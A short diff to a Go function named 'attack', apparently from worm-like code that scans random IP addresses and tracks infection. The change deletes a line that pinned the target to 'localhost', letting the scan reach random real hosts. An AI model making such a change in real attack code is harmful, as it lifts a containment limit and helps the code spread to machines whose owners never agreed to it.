@@ -17,7 +17,6 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 	var ports [3]int
 	for i := 0; i < it; i++ {
 		ip = scan.GetRandomIp(baseIp)
-		ip = "localhost"
 		fmt.Println(attackerString + ip)
 		ports = scan.ScanIp(ip)
 		infected := false
